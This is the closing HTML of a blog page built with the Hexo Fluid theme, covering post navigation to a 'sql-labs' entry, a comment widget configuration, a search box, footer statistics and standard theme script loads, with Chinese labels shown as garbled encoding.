                        <span class="visible-mobile">ä¸Šä¸€ç¯‡</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2023/12/14/sql-labs/" title="sql-labs">
                        <span class="hidden-mobile">sql-labs</span>
                        <span class="visible-mobile">ä¸‹ä¸€ç¯‡</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  
  
    <article id="comments" lazyload>
      
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
        var options = Object.assign(
          {"appId":"s4tVoJPA4mLOJlnbTS9bKQCz-MdYXbMMI","appKey":"2jVxSBuNhzKC1JEOZN2aZTgr","path":"window.location.pathname","placeholder":"è¯´ç‚¹ä»€ä¹ˆ","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


    </article>
  


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>ç›®å½•</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">æœç´¢</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">å…³é”®è¯</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="leancloud-site-pv-container" style="display: none">
        æ€»è®¿é—®é‡ 
        <span id="leancloud-site-pv"></span>
         æ¬¡
      </span>
    
    
      <span id="leancloud-site-uv-container" style="display: none">
        æ€»è®¿å®¢é‡ 
        <span id="leancloud-site-uv"></span>
         äºº
      </span>
    
    

  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script defer src="/js/leancloud.js" ></script>

  <script  src="/js/local-search.js" ></script>





<!-- ä¸»é¢˜çš„å¯åŠ¨é¡¹ï¼Œå°†å®ƒä¿æŒåœ¨æœ€åº•éƒ¨ -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">åšå®¢åœ¨å…è®¸ JavaScript è¿è¡Œçš„ç¯å¢ƒä¸‹æµè§ˆæ•ˆæœæ›´ä½³</div>
  </noscript>
</body>
</html>
